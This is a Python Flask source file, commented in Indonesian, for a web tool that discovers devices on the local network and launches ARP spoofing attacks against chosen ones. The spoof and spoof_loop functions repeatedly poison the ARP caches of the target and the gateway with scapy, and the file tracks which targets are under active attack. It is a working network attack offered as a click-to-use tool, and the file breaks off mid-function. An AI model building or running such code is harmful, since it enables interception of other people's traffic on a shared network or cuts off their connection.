from flask import Flask, render_template, request, jsonify
from scapy.all import ARP, Ether, srp, send, conf
import threading
import time
import socket
import os
import subprocess
import ipaddress
import struct

app = Flask(__name__)

# --- KONFIGURASI JARINGAN ---
# Akan di-auto-detect, tapi bisa di-override manual
# conf.iface = r"\\Device\\NPF_{BAC1A529-DE4F-449B-AF39-6C37D774AC8F}"

# Auto-detect gateway dan subnet
def get_network_info():
    """Auto-detect gateway IP dan subnet dari routing table Windows.
    
    Strategi: Parse ipconfig per-adapter block, pilih adapter yang punya
    default gateway valid (itu yang terhubung ke internet/router).
    """
    try:
        result = subprocess.check_output("ipconfig", shell=True).decode('utf-8', errors='ignore')
        
        # Parse per-adapter block
        adapters = []
        current = {'name': '', 'ip': None, 'mask': None, 'gateway': None}
        
        for line in result.splitlines():
            stripped = line.strip()
            
            # Baris nama adapter (tidak di-indent, diakhiri ':')
            if line and not line.startswith(' ') and line.rstrip().endswith(':'):
                # Simpan adapter sebelumnya jika valid
                if current.get('ip'):
                    adapters.append(current.copy())
                current = {'name': stripped.rstrip(':'), 'ip': None, 'mask': None, 'gateway': None}
            
            if "IPv4 Address" in line or ("IP Address" in line and "IPv6" not in line):
                parts = line.split(":")
                if len(parts) >= 2:
                    ip = parts[-1].strip()
                    if ip and '.' in ip and not ip.startswith("169.254"):
                        current['ip'] = ip
            
            if "Subnet Mask" in line:
                parts = line.split(":")
                if len(parts) >= 2:
                    mask = parts[-1].strip()
                    if mask and '.' in mask:
                        current['mask'] = mask
            
            if "Default Gateway" in line or "Gateway" in line:
                parts = line.split(":")
                if len(parts) >= 2:
                    gw = parts[-1].strip()
                    if gw and '.' in gw:
                        current['gateway'] = gw
        
        # Simpan adapter terakhir
        if current.get('ip'):
            adapters.append(current.copy())
        
        # Pilih adapter terbaik: yang punya gateway (= terhubung ke router)
        best = None
        for adapter in adapters:
            if adapter.get('gateway') and adapter.get('ip'):
                best = adapter
                break
        
        # Fallback: ambil adapter pertama yang punya IP
        if not best:
            for adapter in adapters:
                if adapter.get('ip'):
                    best = adapter
                    break
        
        if best:
            local_ip = best['ip']
            subnet_mask = best.get('mask', '255.255.255.0')
            # Jika gateway tidak terdeteksi (hanya IPv6 atau kosong), default ke x.x.x.1
            gateway = best.get('gateway') or (local_ip.rsplit('.', 1)[0] + '.1')
            adapter_name = best.get('name', 'Unknown')
            print(f"[*] Adapter terpilih: {adapter_name}")
        else:
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            subnet_mask = "255.255.255.0"
            gateway = "192.168.1.1"
            
        # Hitung network range
        ip_int = struct.unpack('!I', socket.inet_aton(local_ip))[0]
        mask_int = struct.unpack('!I', socket.inet_aton(subnet_mask))[0]
        network_int = ip_int & mask_int
        network_ip = socket.inet_ntoa(struct.pack('!I', network_int))
        
        # Hitung CIDR
        cidr = bin(mask_int).count('1')
        ip_range = f"{network_ip}/{cidr}"
        
        return {
            'gateway': gateway,
            'local_ip': local_ip,
            'subnet_mask': subnet_mask,
            'ip_range': ip_range,
            'subnet': '.'.join(local_ip.split('.')[:3])
        }
    except Exception as e:
        print(f"[!] Auto-detect gagal: {e}, pakai default")
        return {
            'gateway': "192.168.1.1",
            'local_ip': "192.168.1.100",
            'subnet_mask': "255.255.255.0",
            'ip_range': "192.168.1.0/24",
            'subnet': "192.168.1"
        }

NETWORK = get_network_info()
GATEWAY_IP = NETWORK['gateway']
IP_RANGE = NETWORK['ip_range']
SUBNET = NETWORK['subnet']

print(f"[*] Gateway: {GATEWAY_IP}")
print(f"[*] Local IP: {NETWORK['local_ip']}")
print(f"[*] IP Range: {IP_RANGE}")

active_attacks = {}
attack_threads = {}

def get_local_info():
    """Ambil info lokal (IP + MAC + Hostname)."""
    try:
        hostname = socket.gethostname()
        local_ip = NETWORK['local_ip']
        # Ambil MAC address dari ipconfig /all
        mac = get_mac_from_arp(local_ip) or "Komputer Anda"
        return {
            'ip': local_ip,
            'mac': mac,
            'hostname': hostname + " (Anda)",
            'is_self': True
        }
    except:
        return {
            'ip': NETWORK['local_ip'],
            'mac': 'Unknown',
            'hostname': 'Komputer Anda',
            'is_self': True
        }

def get_mac_from_arp(ip):
    """Ambil MAC dari ARP table lokal."""
    try:
        result = subprocess.check_output("arp -a", shell=True).decode('utf-8', errors='ignore')
        for line in result.splitlines():
            if ip in line:
                parts = line.split()
                if len(parts) >= 2:
                    mac = parts[1].strip()
                    if '-' in mac or ':' in mac:
                        return mac
    except:
        pass
    return None

def get_mac(ip):
    """Ambil MAC address via ARP request (Scapy)."""
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=False)
        if ans:
            return ans[0][1].hwsrc
    except Exception as e:
        print(f"[!] get_mac error for {ip}: {e}")
    return None

def get_hostname(ip):
    """Coba resolve hostname dari IP."""
    try:
        hostname = socket.gethostbyaddr(ip)[0]
        return hostname
    except:
        return None

def get_vendor_hint(mac):
    """Kasih hint vendor dari MAC prefix (sederhana)."""
    if not mac:
        return ""
    mac_upper = mac.upper().replace("-", ":").replace(".", ":")
    # Beberapa vendor umum
    vendors = {
        "00:50:56": "VMware",
        "00:0C:29": "VMware",
        "08:00:27": "VirtualBox",
        "B8:27:EB": "Raspberry Pi",
        "DC:A6:32": "Raspberry Pi",
        "FC:FB:FB": "Cisco",
        "00:1A:2B": "Cisco",
        "AC:CF:85": "TP-Link",
        "50:C7:BF": "TP-Link",
        "60:E3:27": "TP-Link",
        "C0:25:E9": "TP-Link",
        "14:CC:20": "TP-Link",
        "30:B5:C2": "TP-Link",
        "EC:08:6B": "TP-Link",
        "34:60:F9": "TP-Link",
        "70:4F:57": "TP-Link",
        "18:D6:C7": "TP-Link",
        "B0:BE:76": "TP-Link",
        "98:DA:C4": "TP-Link",
        "1C:3B:F3": "Huawei",
        "00:E0:FC": "Huawei",
        "70:72:3C": "Huawei",
        "48:46:FB": "Huawei",
        "AC:61:EA": "Huawei",
        "88:66:39": "Huawei",
        "F8:4A:BF": "Xiaomi",
        "28:6C:07": "Xiaomi",
        "64:CC:2E": "Xiaomi",
        "9C:99:A0": "Xiaomi",
        "78:11:DC": "Xiaomi",
        "50:64:2B": "Xiaomi",
        "A4:77:33": "Google",
        "F4:F5:D8": "Google",
        "54:60:09": "Google",
        "3C:5A:B4": "Google",
        "F8:1A:67": "TP-Link",
        "D8:0D:17": "TP-Link",
        "3C:22:FB": "Apple",
        "F0:D4:F6": "Apple",
        "AC:BC:32": "Apple",
        "A4:83:E7": "Apple",
        "00:17:88": "Philips Hue",
        "FC:A1:83": "Samsung",
        "8C:F5:A3": "Samsung",
        "C0:97:27": "Samsung",
        "10:D5:42": "Samsung",
        "84:25:DB": "Samsung",
        "34:14:5F": "Samsung",
        "E4:7D:BD": "Samsung",
        "C4:73:1E": "Samsung",
        "A0:C5:89": "Intel",
        "00:1B:21": "Intel",
        "3C:97:0E": "Intel",
        "F8:63:3F": "Intel",
        "8C:8E:F2": "Apple",
        "DC:A4:CA": "Apple",
        "70:56:81": "Apple",
        "BC:52:B7": "Apple",
        "78:7B:8A": "Apple",
        "AC:DE:48": "Apple",
        "F0:18:98": "Apple",
        "98:01:A7": "Apple",
        "14:7D:DA": "Apple",
        "E0:B5:2D": "Apple",
        "38:F9:D3": "Apple",
        "6C:96:CF": "Apple",
        "00:1E:C2": "Apple",
        "9C:20:7B": "Apple",
        "B0:34:95": "Apple",
        "18:65:90": "Apple",
        "B8:E8:56": "Apple",
        "88:E9:FE": "Apple",
        "04:F1:28": "Apple",
        "40:4D:7F": "Apple",
        "2C:BE:EB": "Apple",
        "D0:25:98": "Apple",
        "F0:B4:79": "Apple",
        "B4:18:D1": "Apple",
        "68:AB:1E": "Apple",
        "20:C9:D0": "Apple",
        "54:26:96": "Apple",
        "D8:BB:2C": "Apple",
        "E8:06:88": "Apple",
        "4C:57:CA": "Apple",
        "CC:29:F5": "Apple",
        "D8:1C:79": "Apple",
        "74:E2:F5": "Apple",
        "7C:D1:C3": "Apple",
        "00:CD:FE": "Apple",
        "98:E0:D9": "Apple",
        "CC:08:8D": "Apple",
        "D4:61:9D": "Apple",
        "6C:94:66": "Apple",
        "B0:70:2D": "Apple",
        "C8:2A:14": "Apple",
        "3C:06:30": "Apple",
        "20:78:F0": "Apple",
        "3C:15:C2": "Apple",
        "BC:A9:20": "Apple",
        "AC:FD:CE": "Apple",
        "D0:03:4B": "Apple",
        "04:69:F8": "Apple",
        "D0:C5:F3": "Apple",
        "80:E6:50": "Apple",
        "CC:20:E8": "Apple",
        "A4:D1:8C": "Apple",
        "2C:F0:EE": "Apple",
        "C0:B6:58": "Apple",
        "F4:5C:89": "Apple",
        "DC:2B:2A": "Apple",
        "24:A0:74": "Apple",
        "58:B0:35": "Apple",
        "40:B3:95": "Apple",
        "40:33:1A": "Apple",
        "00:88:65": "Apple",
        "38:CA:DA": "Apple",
        "C8:69:CD": "Apple",
        "C4:B3:01": "Apple",
        "D8:D1:CB": "Apple",
        "98:9E:63": "Apple",
        "00:F4:B9": "Apple",
        "60:F8:1D": "Apple",
        "68:DB:F5": "Apple",
        "04:4B:ED": "Apple",
        "3C:E0:72": "Apple",
        "A8:96:8A": "Apple",
        "CC:44:63": "Apple",
        "B8:53:AC": "Apple",
        "C8:33:4B": "Apple",
        "CC:25:EF": "Apple",
        "28:CF:E9": "Apple",
        "34:C0:59": "Apple",
        "F0:CB:A1": "Apple",
        "18:E7:F4": "Apple",
        "4C:32:75": "Apple",
        "00:26:B0": "Apple",
        "00:26:BB": "Apple",
        "D4:F4:6F": "Apple",
        "00:23:6C": "Apple",
        "00:25:00": "Apple",
        "00:24:36": "Apple",
        "C0:CE:CD": "Apple",
        "D0:E1:40": "Apple",
        "60:FB:42": "Apple",
        "28:E0:2C": "Apple",
        "24:F6:77": "Apple",
        "3C:AB:8E": "Apple",
        "CC:78:5F": "Apple",
        "48:D7:05": "Apple",
        "D0:D2:B0": "Apple",
        "1C:AB:A7": "Apple",
        "04:D3:CF": "Apple",
        "84:38:35": "Apple",
        "50:32:75": "Apple",
        "14:10:9F": "Apple",
        "0C:3E:9F": "Apple",
        "34:36:3B": "Apple",
        "C8:B5:B7": "Apple",
        "D8:30:62": "Apple",
        "A8:86:DD": "Apple",
        "C0:63:94": "Apple",
        "20:AB:37": "Apple",
        "60:FE:C5": "Apple",
        "BC:67:78": "Apple",
        "00:50:E4": "Apple",
        "00:0D:93": "Apple",
        "F0:DC:E2": "Apple",
        "2C:B4:3A": "Apple",
        "68:A8:6D": "Apple",
        "78:CA:39": "Apple",
        "18:AF:61": "Apple",
        "00:1C:B3": "Apple",
        "00:1D:4F": "Apple",
        "00:1E:52": "Apple",
        "00:1F:5B": "Apple",
        "00:1F:F3": "Apple",
        "00:21:E9": "Apple",
        "00:22:41": "Apple",
        "00:23:12": "Apple",
        "00:23:32": "Apple",
        "00:23:DF": "Apple",
        "00:25:4B": "Apple",
        "00:25:BC": "Apple",
        "00:26:4A": "Apple",
        "04:0C:CE": "Apple",
        "04:15:52": "Apple",
        "04:1E:64": "Apple",
        "04:26:65": "Apple",
        "04:48:9A": "Apple",
        "04:52:F3": "Apple",
        "04:54:53": "Apple",
        "04:DB:56": "Apple",
        "04:E5:36": "Apple",
        "04:F7:E4": "Apple",
        "08:66:98": "Apple",
        "08:6D:41": "Apple",
        "08:74:02": "Apple",
        "0C:4D:E9": "Apple",
        "0C:74:C2": "Apple",
        "0C:77:1A": "Apple",
        "0C:BC:9F": "Apple",
        "0C:D7:46": "Apple",
        "10:1C:0C": "Apple",
        "10:40:F3": "Apple",
        "10:41:7F": "Apple",
        "10:93:E9": "Apple",
        "10:9A:DD": "Apple",
        "10:DD:B1": "Apple",
        "14:10:9F": "Apple",
        "14:20:5E": "Apple",
        "14:5A:05": "Apple",
        "14:8F:C6": "Apple",
        "14:99:E2": "Apple",
        "14:BD:61": "Apple",
        "18:20:32": "Apple",
        "18:34:51": "Apple",
        "18:3E:EF": "Apple",
        "18:81:0E": "Apple",
        "18:9E:FC": "Apple",
        "18:AF:8F": "Apple",
        "18:E7:F4": "Apple",
        "18:EE:69": "Apple",
        "18:F1:D8": "Apple",
        "1C:1A:C0": "Apple",
        "1C:36:BB": "Apple",
        "1C:5C:F2": "Apple",
        "1C:91:48": "Apple",
        "1C:E6:2B": "Apple",
        "20:3C:AE": "Apple",
        "20:7D:74": "Apple",
        "20:9B:CD": "Apple",
        "20:A2:E4": "Apple",
        "20:AB:37": "Apple",
        "20:C9:D0": "Apple",
        "20:EE:28": "Apple",
        "24:1E:EB": "Apple",
        "24:24:0E": "Apple",
        "24:AB:81": "Apple",
        "24:E3:14": "Apple",
        "24:F0:94": "Apple",
        "28:0B:5C": "Apple",
        "28:37:37": "Apple",
        "28:56:5A": "Apple",
        "28:6A:B8": "Apple",
        "28:6A:BA": "Apple",
        "28:A0:2B": "Apple",
        "28:CF:DA": "Apple",
        "28:CF:E9": "Apple",
        "28:E1:4C": "Apple",
        "28:E7:CF": "Apple",
        "28:ED:6A": "Apple",
        "28:F0:76": "Apple",
        "2C:1F:23": "Apple",
        "2C:20:0B": "Apple",
        "2C:33:61": "Apple",
        "2C:3A:E8": "Apple",
        "2C:54:CF": "Apple",
        "2C:B4:3A": "Apple",
        "2C:BE:EB": "Apple",
        "2C:F0:A2": "Apple",
        "2C:F0:EE": "Apple",
        "30:10:E4": "Apple",
        "30:35:AD": "Apple",
        "30:63:6B": "Apple",
        "30:90:AB": "Apple",
        "30:F7:C5": "Apple",
        "34:08:BC": "Apple",
        "34:12:98": "Apple",
        "34:15:9E": "Apple",
        "34:36:3B": "Apple",
        "34:51:C9": "Apple",
        "34:AB:37": "Apple",
        "34:C0:59": "Apple",
        "34:E2:FD": "Apple",
        "38:0F:4A": "Apple",
        "38:48:4C": "Apple",
        "38:66:F0": "Apple",
        "38:71:DE": "Apple",
        "38:B5:4D": "Apple",
        "38:C9:86": "Apple",
        "38:CA:DA": "Apple",
        "3C:07:54": "Apple",
        "3C:15:C2": "Apple",
        "3C:2E:F9": "Apple",
        "44:D8:84": "Apple",
        "48:74:6E": "Apple",
        "48:A1:95": "Apple",
        "4C:8D:79": "Apple",
        "4C:B1:99": "Apple",
        "50:BC:96": "Apple",
        "50:EA:D6": "Apple",
        "54:33:CB": "Apple",
        "54:4E:90": "Apple",
        "54:72:4F": "Apple",
        "54:9F:13": "Apple",
        "54:AE:27": "Apple",
        "54:E4:3A": "Apple",
        "54:EA:A8": "Apple",
        "58:1F:AA": "Apple",
        "58:40:4E": "Apple",
        "58:55:CA": "Apple",
        "5C:59:48": "Apple",
        "5C:8D:4E": "Apple",
        "5C:95:AE": "Apple",
        "5C:96:9D": "Apple",
        "5C:97:F3": "Apple",
        "5C:F5:DA": "Apple",
        "5C:F7:E6": "Apple",
        "60:03:08": "Apple",
        "60:33:4B": "Apple",
        "60:69:44": "Apple",
        "60:73:5C": "Apple",
        "60:8C:4A": "Apple",
        "60:92:17": "Apple",
        "60:9A:C1": "Apple",
        "60:A3:7D": "Apple",
        "60:C5:47": "Apple",
        "60:D9:C7": "Apple",
        "60:F4:45": "Apple",
        "60:FA:CD": "Apple",
        "64:20:0C": "Apple",
        "64:76:BA": "Apple",
        "64:9A:BE": "Apple",
        "64:A3:CB": "Apple",
        "64:A5:C3": "Apple",
        "64:B0:A6": "Apple",
        "64:E6:82": "Apple",
        "68:09:27": "Apple",
        "68:5B:35": "Apple",
        "68:64:4B": "Apple",
        "68:96:7B": "Apple",
        "68:9C:70": "Apple",
        "68:A8:6D": "Apple",
        "68:AB:1E": "Apple",
        "68:AE:20": "Apple",
        "68:D9:3C": "Apple",
        "68:DB:CA": "Apple",
        "68:FE:F7": "Apple",
        "6C:3E:6D": "Apple",
        "6C:40:08": "Apple",
        "6C:4D:73": "Apple",
        "6C:70:9F": "Apple",
        "6C:72:E7": "Apple",
        "6C:94:66": "Apple",
        "6C:96:CF": "Apple",
        "6C:C2:6B": "Apple",
        "70:11:24": "Apple",
        "70:3E:AC": "Apple",
        "70:56:81": "Apple",
        "70:73:CB": "Apple",
        "70:81:EB": "Apple",
        "70:A2:B3": "Apple",
        "70:CD:60": "Apple",
        "70:DE:E2": "Apple",
        "70:EC:E4": "Apple",
        "70:EF:00": "Apple",
        "74:1B:B2": "Apple",
        "74:8D:08": "Apple",
        "74:E1:B6": "Apple",
        "74:E2:F5": "Apple",
        "78:31:C1": "Apple",
        "78:3A:84": "Apple",
        "78:67:D7": "Apple",
        "78:6C:1C": "Apple",
        "78:7B:8A": "Apple",
        "78:7E:61": "Apple",
        "78:88:6D": "Apple",
        "78:9F:70": "Apple",
        "78:A3:E4": "Apple",
        "78:CA:39": "Apple",
        "78:D7:5F": "Apple",
        "78:FD:94": "Apple",
        "7C:01:0A": "Apple",
        "7C:04:D0": "Apple",
        "7C:11:BE": "Apple",
        "7C:50:49": "Apple",
        "7C:6D:62": "Apple",
        "7C:C3:A1": "Apple",
        "7C:C5:37": "Apple",
        "7C:D1:C3": "Apple",
        "7C:F0:5F": "Apple",
        "7C:FA:DF": "Apple",
        "80:00:6E": "Apple",
        "80:49:71": "Apple",
        "80:92:9F": "Apple",
        "80:B0:3D": "Apple",
        "80:BE:05": "Apple",
        "80:E6:50": "Apple",
        "80:EA:96": "Apple",
        "80:ED:2C": "Apple",
        "84:29:99": "Apple",
        "84:38:35": "Apple",
        "84:78:8B": "Apple",
        "84:85:06": "Apple",
        "84:89:AD": "Apple",
        "84:B1:53": "Apple",
        "84:FC:AC": "Apple",
        "84:FC:FE": "Apple",
        "88:1F:A1": "Apple",
        "88:53:95": "Apple",
        "88:63:DF": "Apple",
        "88:66:A5": "Apple",
        "88:6B:6E": "Apple",
        "88:C6:63": "Apple",
        "88:CB:87": "Apple",
        "88:E8:7F": "Apple",
        "88:E9:FE": "Apple",
        "8C:00:6D": "Apple",
        "8C:29:37": "Apple",
        "8C:2D:AA": "Apple",
        "8C:58:77": "Apple",
        "8C:7B:9D": "Apple",
        "8C:7C:92": "Apple",
        "8C:85:90": "Apple",
        "8C:8E:F2": "Apple",
        "8C:FA:BA": "Apple",
        "90:3C:92": "Apple",
        "90:72:40": "Apple",
        "90:84:0D": "Apple",
        "90:8D:6C": "Apple",
        "90:B0:ED": "Apple",
        "90:B2:1F": "Apple",
        "90:B9:31": "Apple",
        "90:C1:C6": "Apple",
        "90:FD:61": "Apple",
        "94:94:26": "Apple",
        "94:E9:6A": "Apple",
        "94:F6:A3": "Apple",
        "98:03:D8": "Apple",
        "98:0C:82": "Apple",
        "98:10:E8": "Apple",
        "98:46:0A": "Apple",
        "98:5A:EB": "Apple",
        "98:9E:63": "Apple",
        "98:B8:E3": "Apple",
        "98:CA:33": "Apple",
        "98:D6:BB": "Apple",
        "98:E0:D9": "Apple",
        "98:F0:AB": "Apple",
        "98:FE:94": "Apple",
        "9C:04:EB": "Apple",
        "9C:20:7B": "Apple",
        "9C:29:3F": "Apple",
        "9C:35:EB": "Apple",
        "9C:4F:DA": "Apple",
        "9C:84:BF": "Apple",
        "9C:8B:A0": "Apple",
        "9C:F3:87": "Apple",
        "9C:FC:01": "Apple",
        "A0:18:28": "Apple",
        "A0:3B:E3": "Apple",
        "A0:4E:A7": "Apple",
        "A0:99:9B": "Apple",
        "A0:D7:95": "Apple",
        "A0:ED:CD": "Apple",
        "A4:31:35": "Apple",
        "A4:67:06": "Apple",
        "A4:5E:60": "Apple",
        "A4:B1:97": "Apple",
        "A4:B8:05": "Apple",
        "A4:C3:61": "Apple",
        "A4:D1:8C": "Apple",
        "A4:D1:D2": "Apple",
        "A8:20:66": "Apple",
        "A8:5B:78": "Apple",
        "A8:66:7F": "Apple",
        "A8:86:DD": "Apple",
        "A8:8E:24": "Apple",
        "A8:96:8A": "Apple",
        "A8:BB:CF": "Apple",
        "A8:BE:27": "Apple",
        "A8:FA:D8": "Apple",
        "AC:29:3A": "Apple",
        "AC:3C:0B": "Apple",
        "AC:61:EA": "Apple",
        "AC:7F:3E": "Apple",
        "AC:87:A3": "Apple",
        "AC:BC:32": "Apple",
        "AC:CF:5C": "Apple",
        "AC:E4:B5": "Apple",
        "AC:FD:CE": "Apple",
        "B0:19:C6": "Apple",
        "B0:34:95": "Apple",
        "B0:48:1A": "Apple",
        "B0:65:BD": "Apple",
        "B0:70:2D": "Apple",
        "B0:9F:BA": "Apple",
        "B4:18:D1": "Apple",
        "B4:4B:D2": "Apple",
        "B4:8B:19": "Apple",
        "B4:F0:AB": "Apple",
        "B8:09:8A": "Apple",
        "B8:17:C2": "Apple",
        "B8:41:A4": "Apple",
        "B8:44:D9": "Apple",
        "B8:53:AC": "Apple",
        "B8:63:4D": "Apple",
        "B8:78:2E": "Apple",
        "B8:8D:12": "Apple",
        "B8:C1:11": "Apple",
        "B8:C7:5D": "Apple",
        "B8:E8:56": "Apple",
        "B8:F6:B1": "Apple",
        "B8:FF:61": "Apple",
        "BC:3B:AF": "Apple",
        "BC:4C:C4": "Apple",
        "BC:52:B7": "Apple",
        "BC:54:36": "Apple",
        "BC:67:78": "Apple",
        "BC:92:6B": "Apple",
        "BC:A9:20": "Apple",
        "BC:EC:5D": "Apple",
        "C0:1A:DA": "Apple",
        "C0:63:94": "Apple",
        "C0:84:7A": "Apple",
        "C0:9F:42": "Apple",
        "C0:A5:3E": "Apple",
        "C0:B6:58": "Apple",
        "C0:CC:F8": "Apple",
        "C0:CE:CD": "Apple",
        "C0:D0:12": "Apple",
        "C0:F2:FB": "Apple",
        "C4:2C:03": "Apple",
        "C4:B3:01": "Apple",
        "C8:1E:E7": "Apple",
        "C8:2A:14": "Apple",
        "C8:33:4B": "Apple",
        "C8:3C:85": "Apple",
        "C8:69:CD": "Apple",
        "C8:6F:1D": "Apple",
        "C8:85:50": "Apple",
        "C8:B5:B7": "Apple",
        "C8:BC:C8": "Apple",
        "C8:E0:EB": "Apple",
        "C8:F6:50": "Apple",
        "CC:08:8D": "Apple",
        "CC:20:E8": "Apple",
        "CC:25:EF": "Apple",
        "CC:29:F5": "Apple",
        "CC:44:63": "Apple",
        "CC:78:5F": "Apple",
        "D0:03:4B": "Apple",
        "D0:23:DB": "Apple",
        "D0:25:98": "Apple",
        "D0:33:11": "Apple",
        "D0:4F:7E": "Apple",
        "D0:A6:37": "Apple",
        "D0:C5:F3": "Apple",
        "D0:D2:B0": "Apple",
        "D0:E1:40": "Apple",
        "D4:61:9D": "Apple",
        "D4:9A:20": "Apple",
        "D4:DC:CD": "Apple",
        "D4:F4:6F": "Apple",
        "D8:00:4D": "Apple",
        "D8:1C:79": "Apple",
        "D8:1D:72": "Apple",
        "D8:30:62": "Apple",
        "D8:8F:76": "Apple",
        "D8:96:95": "Apple",
        "D8:9E:3F": "Apple",
        "D8:A2:5E": "Apple",
        "D8:BB:2C": "Apple",
        "D8:CF:9C": "Apple",
        "D8:D1:CB": "Apple",
        "DC:0C:5C": "Apple",
        "DC:2B:2A": "Apple",
        "DC:2B:61": "Apple",
        "DC:37:14": "Apple",
        "DC:41:5F": "Apple",
        "DC:56:E7": "Apple",
        "DC:86:D8": "Apple",
        "DC:9B:9C": "Apple",
        "DC:A4:CA": "Apple",
        "DC:A9:04": "Apple",
        "E0:33:8E": "Apple",
        "E0:5F:45": "Apple",
        "E0:66:78": "Apple",
        "E0:AC:CB": "Apple",
        "E0:B5:2D": "Apple",
        "E0:B9:BA": "Apple",
        "E0:C7:67": "Apple",
        "E0:C9:7A": "Apple",
        "E0:F5:C6": "Apple",
        "E4:25:E7": "Apple",
        "E4:2B:34": "Apple",
        "E4:8B:7F": "Apple",
        "E4:98:D1": "Apple",
        "E4:9A:DC": "Apple",
        "E4:C6:3D": "Apple",
        "E4:CE:8F": "Apple",
        "E4:E0:A6": "Apple",
        "E8:04:0B": "Apple",
        "E8:06:88": "Apple",
        "E8:80:2E": "Apple",
        "E8:8D:28": "Apple",
        "EC:35:86": "Apple",
        "EC:85:2F": "Apple",
        "F0:24:75": "Apple",
        "F0:4F:7C": "Apple",
        "F0:72:8C": "Apple",
        "F0:99:B6": "Apple",
        "F0:B0:E7": "Apple",
        "F0:B4:79": "Apple",
        "F0:C1:F1": "Apple",
        "F0:CB:A1": "Apple",
        "F0:D1:A9": "Apple",
        "F0:DB:E2": "Apple",
        "F0:DC:E2": "Apple",
        "F4:0F:24": "Apple",
        "F4:1B:A1": "Apple",
        "F4:31:C3": "Apple",
        "F4:37:B7": "Apple",
        "F4:5C:89": "Apple",
        "F4:F1:5A": "Apple",
        "F4:F9:51": "Apple",
        "F8:1E:DF": "Apple",
        "F8:27:93": "Apple",
        "F8:62:14": "Apple",
        "F8:95:C7": "Apple",
        "FC:25:3F": "Apple",
        "FC:D8:48": "Apple",
        "FC:E9:98": "Apple",
        "FC:FC:48": "Apple",
        "20:16:D8": "Liteon/ASUS",
        "00:0E:8F": "Sercomm",
        "78:44:76": "TP-Link",
        "D4:6E:0E": "TP-Link",
        "B0:4E:26": "TP-Link",
        "6A:DA:E3": "OPPO",
        "5C:A8:6A": "OPPO",
        "94:65:2D": "OnePlus",
        "C0:EE:FB": "OnePlus",
        "CC:46:D6": "Google",
        "58:CB:52": "Google",
        "40:B4:CD": "Realtek",
        "00:E0:4C": "Realtek",
        "48:5D:60": "Realtek",
        "52:54:00": "QEMU/KVM",
        "00:16:3E": "Xensource",
        "02:42:AC": "Docker",
        "44:44:44": "OPPO",
        "DC:6D:CD": "OPPO",
        "14:77:89": "OPPO",
        "5C:E8:83": "OPPO",
        "00:EC:0A": "Xiaomi",
        "74:23:44": "Xiaomi",
        "34:CE:00": "Xiaomi",
        "58:A0:23": "Xiaomi",
        "A4:77:F3": "Xiaomi",
        "8C:DE:F9": "Xiaomi",
        "74:D4:35": "Gionee",
        "44:2A:60": "Apple",
        "B0:A7:B9": "Apple",
        "F0:D7:AA": "Apple",
        "48:E6:C2": "Apple",
    }
    prefix = mac_upper[:8]
    return vendors.get(prefix, "")

def spoof(target_ip, spoof_ip, target_mac):
    """Kirim paket ARP spoof."""
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False, count=3)

def restore(target_ip, gateway_ip, target_mac, gateway_mac):
    """Restore ARP table ke normal."""
    # Kirim paket ARP yang benar untuk restore koneksi
    packet_to_target = ARP(op=2, pdst=target_ip, hwdst=target_mac,
                           psrc=gateway_ip, hwsrc=gateway_mac)
    packet_to_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
                            psrc=target_ip, hwsrc=target_mac)
    send(packet_to_target, verbose=False, count=5)
    send(packet_to_gateway, verbose=False, count=5)

def spoof_loop(target_ip, gateway_ip):
    """Loop ARP spoof sampai di-stop."""
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    
    if not target_mac or not gateway_mac:
        print(f"[!] Gagal mendapatkan MAC untuk {target_ip} atau gateway")
        active_attacks[target_ip] = False
        return
    
    print(f"[*] Mulai attack {target_ip} (MAC: {target_mac})")
    
    while active_attacks.get(target_ip):
        try:
            spoof(target_ip, gateway_ip, target_mac)
            spoof(gateway_ip, target_ip, gateway_mac)
        except Exception as e:
            print(f"[!] Error saat spoof {target_ip}: {e}")
        time.sleep(1)
    
    # Restore saat dihentikan
    print(f"[*] Restoring ARP untuk {target_ip}...")
    try:
        restore(target_ip, gateway_ip, target_mac, gateway_mac)
        print(f"[*] ARP restored untuk {target_ip}")
    except Exception as e:
        print(f"[!] Error restore ARP: {e}")


@app.route('/')
def index():
    return render_template('index.html')

@app.route('/info', methods=['GET'])
def info():
    """Endpoint untuk ambil info jaringan."""
    return jsonify({
        'gateway': GATEWAY_IP,
        'local_ip': NETWORK['local_ip'],
        'subnet': SUBNET,
        'ip_range': IP_RANGE
    })

@app.route('/scan', methods=['GET'])
def scan():
    """Scan semua device di jaringan."""
    try:
        subnet = SUBNET
        
        # Multi-threaded ping untuk speed
        def ping_host(ip):
            os.system(f"ping -n 1 -w 100 {ip} > nul 2>&1")
        
        threads = []
        for i in range(1, 255):
            ip = f"{subnet}.{i}"
            t = threading.Thread(target=ping_host, args=(ip,), daemon=True)
            threads.append(t)
            t.start()
            # Batch 50 threads at a time
            if len(threads) >= 50:
                for t in threads:
                    t.join(timeout=3)
                threads = []
        
        # Wait for remaining
        for t in threads:
            t.join(timeout=3)
        
        time.sleep(1)
        
        # Parse ARP table
        devices = []
        local_info = get_local_info()
        devices.append(local_info)
        
        result = subprocess.check_output("arp -a", shell=True).decode('utf-8', errors='ignore')
        
        seen_ips = {local_info['ip']}
        
        for line in result.splitlines():
            line_lower = line.lower()
            if "dynamic" in line_lower or "dinamis" in line_lower:
                parts = line.split()
                if len(parts) >= 3:
                    ip = parts[0].strip()
                    mac = parts[1].strip()
                    
                    if not ip.startswith(subnet):
                        continue
                    if ip in seen_ips:
                        continue
                    if mac == "ff-ff-ff-ff-ff-ff":
                        continue
                    
                    seen_ips.add(ip)
                    
                    # Get hostname
                    hostname = get_hostname(ip)
                    vendor = get_vendor_hint(mac)
                    
                    device_name = hostname or ""
                    if vendor:
                        device_name = f"{vendor}" + (f" ({hostname})" if hostname else "")
                    
                    is_gateway = (ip == GATEWAY_IP)
                    is_attacked = active_attacks.get(ip, False)
                    
                    devices.append({
                        'ip': ip,
                        'mac': mac,
                        'hostname': device_name if device_name else "Unknown Device",
                        'is_gateway': is_gateway,
                        'is_self': False,
                        'is_attacked': is_attacked,
                        'vendor': vendor
                    })
        
        # Sort: self first, gateway second, rest by IP
        def sort_key(d):
            if d.get('is_self'):
                return (0, d['ip'])
            if d.get('is_gateway'):
                return (1, d['ip'])
            return (2, d['ip'])
        
        devices.sort(key=sort_key)
        
        return jsonify(devices)
    except Exception as e:
        import traceback
